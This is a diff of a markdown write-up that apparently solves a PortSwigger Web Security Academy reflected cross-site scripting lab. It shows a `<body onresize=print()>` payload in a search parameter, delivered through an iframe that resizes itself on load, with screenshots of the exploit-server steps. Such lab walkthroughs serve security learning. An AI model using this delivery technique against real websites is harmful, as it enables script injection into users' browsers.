@@ -110,10 +110,24 @@ So the every Payloads events are has user interaction . For that we can use ifra
 ```js
 <iframe src = "exploit url path "onload=this.style.width="pixel size according to you.px"></iframe>
 ```
-First this i frame will load the sorce exploit url initally .Once it completely loads right this onloadget triger automatically which will ultimately change this.style.width="pixel size according to you.px" the width of the iframe. when width change the malicious payload will get executed .
+>First this i frame will load the sorce exploit url initally .Once it completely loads right this onloadget triger automatically which will ultimately change this.style.width="pixel size according to you.px" the width of the iframe. when width change the malicious payload will get executed .
 
+### Payload
 
+The exploit url path we alredy executed. = `https://0a350007036b7e8681dc6cd500cc00e9.web-security-academy.net/?search=%3Cbody+onresize%3D+print%28%29%3E.` in which we have already used the payload `<body onresize= print()>`
 
+So The payload will be
 
+```js
+<iframe src = "https://0a350007036b7e8681dc6cd500cc00e9.web-security-academy.net/?search=%3Cbody+onresize%3D+print%28%29%3E" onload=this.style.width="200px" ></iframe> 
+```
 
+![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/dd18551b-e047-4c62-a256-03b0a99e7ee8)
 
+store and press view exploit
+
+![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/eadbccc0-5bf7-4fd9-89e5-4e6da4d9aab0)
+
+send to the victim and lab will be solved.
+
+![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/e9f9e607-15c0-44e9-bbd4-21dcab94dfd8)
